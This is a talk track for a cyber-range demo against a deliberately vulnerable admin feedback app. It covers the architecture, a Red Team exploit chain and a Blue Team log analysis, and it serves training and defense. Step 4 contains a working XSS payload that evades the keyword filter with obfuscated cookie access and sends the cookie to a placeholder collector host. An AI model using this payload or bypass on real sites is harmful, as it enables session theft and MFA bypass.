# Presentation Script: SCENARIO75 Live Demo (15-20 minutes)

**Author:** Asyam Adithakarya Erdi Pribadi
**Format:** Live architecture walkthrough + Red Team exploit demo + Blue Team log analysis

Use this as a talk track, not a script to read verbatim. Timings are approximate.

---

## 1. Architecture overview (3 minutes)

Talking points:

- "The lab is three Docker containers behind one internal bridge network aliased `feedback.admin.local`, matching the internal-zone assumption in the brief."
- `app`: the vulnerable Admin Feedback System, Node.js/Express, port 3075.
- `ssh-blue`: the Blue Team's jump box, SSH on port 2275, mounts the same log volume as the app's logging mechanism.
- `log-injector`: a one-shot container that seeds `/opt/admin/logs` with a realistic, pre-written attack sequence, so the Blue Team has telemetry to hunt through without needing a live attack to have just happened.
- "Everything is brought up by one script, `setup_proxmox_vm.sh`, which installs Docker on a bare VM, builds the three images, and runs the seeding job - this is what would run on the Proxmox guest."

Show the `docker-compose.yml` on screen for 20-30 seconds; point out the shared `admin-logs` volume and the network alias.

## 2. The vulnerability, in one sentence (1 minute)

"The admin dashboard treats the mere *presence* of a pre-authentication cookie as proof that MFA already happened. It never calls the MFA verification endpoint, so stealing that one cookie through a reflected XSS is enough to fully authenticate."

## 3. Red Team live exploit chain (7-8 minutes)

Run these against the deployed VM, narrating each step:

```bash
# Step 1 - Recon: what's the backend, what's hidden
curl -I http://<vm-ip>:3075/
curl http://<vm-ip>:3075/robots.txt
```
"X-Powered-By tells us Node.js. robots.txt tells the crawler to stay away from /api/verify-mfa - which is exactly why we'll go look at it."

```bash
# Step 2 - Inspect the cookie
curl -sD - -c cookies.txt http://<vm-ip>:3075/ -o /dev/null
```
"pre_mfa_session is set with no HttpOnly flag. That's a deliberate flaw: any script running on this origin can read it."

```bash
# Step 3 - Try the obvious XSS, get blocked
curl -sD - -X POST http://<vm-ip>:3075/api/feedback -d "comment=<script>alert(1)</script>"
```
"403, blocked by a keyword-matching WAF rule on <script>."

```bash
# Step 4 - Bypass with <svg onload>, obfuscate the cookie access
curl -sD - -X POST http://<vm-ip>:3075/api/feedback \
  --data-urlencode "comment=<svg onload=fetch('http://<collector-ip>/steal?c='+window['docu'+'ment']['coo'+'kie'])>"
```
"The WAF only pattern-matches `<script` and the literal string `document.cookie`. SVG onload sidesteps the tag filter; bracket-notation string concatenation sidesteps the keyword filter. 200 OK - it's stored."

```bash
# Step 5 - Replay the stolen cookie straight onto the admin dashboard
curl -sD - -b cookies.txt http://<vm-ip>:3075/dashboard
```
"No MFA prompt, no redirect to /api/verify-mfa - we're straight into the dashboard with a brand-new adm_sess cookie, and the payload we planted is reflected back inside .xss-payload, proving the stored XSS actually executes in this context. The victory flag is sitting in the page source."

"That's reconnaissance to full admin access in five requests, zero credentials."

## 4. Blue Team log analysis (6-7 minutes)

SSH into the box on screen:

```bash
ssh analyst@<vm-ip> -p 2275
cd /opt/admin/logs
```

```bash
# Baseline vs. attacker traffic
grep -E "192.168.1.100|10.10.14.50" access.log
```
"192.168.1.100 is the legitimate admin's normal background traffic. 10.10.14.50 shows up cold at 18:49:58, which is our first indicator - it's outside the 192.168.1.0/24 admin range entirely, sitting in 10.10.14.0/24."

```bash
# The WAF catching the first attempt
grep "<script>" error.log
```
"18:50:15, WARN level - this is the moment the naive payload got blocked. If we'd stopped analysis here we might think the attack failed."

```bash
# But then...
grep "/dashboard" access.log
```
"18:51:55, 200 on /dashboard from the same attacker IP, less than two minutes after the blocked attempt. And look at the XFF field on that line..."

```bash
grep 'XFF=' access.log | grep -oP 'XFF="\K[^"]+'
echo "U0NFTkFSSU83NXtCTFUzX0wwR19IVU5UM1JfMHduM2R9" | base64 -d
```
"That's not a real IP, it's Base64, and it decodes to the exfiltrated flag. Classic technique: hide stolen data inside a header nobody double-checks."

```bash
grep "verify-mfa" access.log
```
"No results for 10.10.14.50. The attacker's IP never touched the MFA endpoint at all - directly confirms the bypass."

```bash
grep CRITICAL error.log
grep "18:53:10" error.log
```
"The application itself flags the cookie reuse as CRITICAL, and logs an explicit authentication-bypass anomaly a minute later. That's the smoking gun for the incident report."

"Full story, purely from logs: recon at 18:49, blocked naive XSS at 18:50:15, successful bypass thirty seconds later, cookie replay and exfiltration at 18:51:55, and the application's own anomaly detection confirming it by 18:53:10."

## 5. Close (1 minute)

- Root cause: session-state trust boundary flaw (presence-of-cookie treated as proof-of-MFA), compounded by a signature-based WAF and a non-HttpOnly session cookie.
- Fix path (if asked): bind `/dashboard` authorization to a server-side session record that only flips to "MFA-verified" after `/api/verify-mfa` actually succeeds; set `HttpOnly` + `Secure` + `SameSite=Strict` on all session cookies; move the WAF from blocklist/keyword matching to an allowlist or a maintained ruleset (e.g. OWASP CRS) rather than custom regex.
- One housekeeping note worth mentioning if time allows: the brief's own sample exfiltration string had an internal inconsistency (wrong length, wrong flag format) - we caught it, documented it, and used a corrected, consistent value instead. Worth flagging as the kind of detail-level QA this role expects.
